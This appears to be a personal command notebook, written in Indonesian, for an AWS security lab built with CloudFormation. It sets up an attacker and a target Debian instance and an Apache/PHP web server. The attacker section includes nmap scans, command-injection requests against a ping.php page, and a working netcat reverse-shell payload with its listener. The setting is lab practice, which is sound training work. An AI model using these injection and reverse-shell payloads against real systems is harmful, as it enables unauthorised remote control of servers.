
# 1. buat vpc 
aws cloudformation create-stack --stack-name security-lab-vpc --template-body file://01-vpc-security.yaml --region ap-southeast-1 --no-cli-pager

# delete stack
aws cloudformation delete-stack --stack-name security-lab-vpc --region ap-southeast-1 --no-cli-pager
aws cloudformation delete-stack --stack-name vpc-security-01 --region ap-southeast-1 --no-cli-pager

# memantau status 
aws cloudformation describe-stacks --stack-name security-lab-vpc --query "Stacks[0].StackStatus" --output text --region ap-southeast-1 --no-cli-pager

# melihat status vpc
aws cloudformation describe-stacks --stack-name security-lab-vpc --query "Stacks[0].StackStatus" --output text --region ap-southeast-1 --no-cli-pager

# melihat daftar vpc

#delete stack 
aws cloudformation delete-stack --stack-name vpc-security-01

# 2. buat ec2 attacker
aws cloudformation create-stack --stack-name security-lab-debian --template-body file://02-debian-instance.yaml --capabilities CAPABILITY_NAMED_IAM --parameters ParameterKey=NetworkStackName,ParameterValue=security-lab-vpc --region ap-southeast-1 --no-cli-pager

# 3. buat ec2 target
aws cloudformation create-stack --stack-name security-lab-target --template-body file://03-debian-target.yaml --capabilities CAPABILITY_NAMED_IAM --parameters ParameterKey=NetworkStackName,ParameterValue=security-lab-vpc --region ap-southeast-1 --no-cli-pager


#delete stack
aws cloudformation delete-stack --stack-name instances-02

#stop ec2 
aws ec2 stop-instances --instance-ids $(aws cloudformation describe-stacks --stack-name instances-02 --query "Stacks[0].Outputs[?OutputKey=='AttackerInstanceId' || OutputKey=='TargetInstanceId'].OutputValue" --output text)

#start ec2 
aws ec2 start-instances --instance-ids $(aws cloudformation describe-stacks --stack-name instances-02 --query "Stacks[0].Outputs[?OutputKey=='AttackerInstanceId' || OutputKey=='TargetInstanceId'].OutputValue" --output text)

#cek status 
aws cloudformation describe-stacks --stack-name instances-02 --no-cli-pager --query "Stacks[0].{Status:StackStatus, Outputs:Outputs}"


================================================================================================
# Update repository dan install ssm agent 
sudo apt-get update -y

# Download installer SSM Agent
wget https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/debian_amd64/amazon-ssm-agent.deb

# Install SSM Agent
sudo dpkg -i amazon-ssm-agent.deb

# Aktifkan & Jalankan service
sudo systemctl enable amazon-ssm-agent
sudo systemctl start amazon-ssm-agent

# Cek statusnya
sudo systemctl status amazon-ssm-agent


=============== PENYERANG : 10.0.1.175 ==========================================================
hostname -I
ip a
curl ifconfig.me

sudo apt update && sudo apt install nmap -y
nmap -sn IP-DEBIAN-TARGET
nmap -sV IP-DEBIAN-TARGET
nmap -A IP-DEBIAN-TARGET

sudo apt install -y nmap netcat-traditional curl wget dnsutils
ping -c 3 10.0.1.23
nmap -sV 10.0.1.23
curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1"
curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1;whoami"
curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1;cat+/etc/passwd"

nc -lvnp 4444
# Tes 1: Cek apakah ping.php bisa dijangkau
curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1"

# Tes 2: Cek apakah Command Injection berjalan (Tes sederhana)
curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1;whoami"

curl "http://10.0.1.23/ping.php?ip=127.0.0.1;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2%261|nc+10.0.1.175+4444+>/tmp/f"


ouput nya harus nya : 
Connection received on 10.0.1.23 41650

====================TARGET : 10.0.1.23 ==================================================
# 1. Update repositori sistem
sudo apt update && sudo apt upgrade -y

# 2. Install Web Server (Apache) dan PHP
sudo apt install apache2 php libapache2-mod-php -y

# 3. Pastikan service Apache berjalan
sudo systemctl enable apache2
sudo systemctl start apache2

# 4. cek 
sudo apt install nmap -y
nmap localhost
sudo ss -tulpn
